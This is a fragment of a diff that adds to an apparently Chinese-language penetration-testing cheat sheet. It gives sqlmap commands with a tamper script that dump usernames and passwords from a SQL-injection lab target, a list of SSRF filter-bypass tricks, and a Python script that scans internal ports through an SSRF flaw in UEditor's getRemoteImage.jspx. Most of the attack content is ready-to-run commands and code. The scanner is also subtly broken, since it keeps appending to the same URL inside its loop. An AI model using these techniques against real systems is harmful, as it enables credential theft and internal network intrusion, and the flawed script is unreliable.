+>>> sqlmap -u "http://IP/sqli/Less-4/?id=1" --tamper "Bypass.py" -v 3 -D "security" -T "users" --columns
+>>> sqlmap -u "http://IP/sqli/Less-4/?id=1" --tamper "Bypass.py" -v 3 -D "security" -C "username,password" --dump
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>SSRF_Server-Side Rquest Forger_服务器端请求伪造漏洞</summary>
+
+```
+----------------------------------------------------------------------------
+//通过SSRF结合 未授权访问漏洞 进行渗透
+
+//SSRF应用场景： 分享功能、远程加载
+
+//SSRF绕过技巧
+1.利用@符号绕过，例如www.baidu.com@127.0.0.1
+2.利用短网址绕过，例如http://suo.im/4SmyzG
+3.利用xip.io 127.0.0.1 xip.io  绕过
+4.利用封闭式字母数据(Enclosed alphanumeric)绕过
+----------------------------------------------------------------------------
+检测方法
+
+判断是否存在SSRF，只需在漏洞URL处输入公网服务器的Web应用地址，然后在公网服务器上监控访问的数据，发现有存在漏洞的IP访问，便说明存在SSRF漏洞
+
+步骤:[1]构造portscan方法，接收两个参数，第一个参数为拼接成SSRF漏洞的地址，第二个参数作为内网探测地址
+[2]通过访问构造的URL，根据返回值判断端口是否开放
+----------------------------------------------------------------------------
+#!/usr/bin/env python
+# -*- coding-utf-8 -*-
+import requests
+
+def portscan(url, rurl):
+    ports = [21,22,23,25,80,443,445,873,1080,1099,1090,1521,3306,6379,27017]
+    for port in ports:
+        try:
+            url = url + '/ueditor/getRemoteImage.jspx?upfile=' + rurl + ':{port}'.format(port=port)
+            response = requests.get(url, timeout=6)
+        except:
+            #超过6秒就认为端口是开饭
+            print('[+]{port} is open'.format(port=port))
+
+if __name__ == '__main__':
+    portscan('http://www.target.com', '192.168.23.1')
+----------------------------------------------------------------------------
 ```
 
 </details>
 
 
-
+  
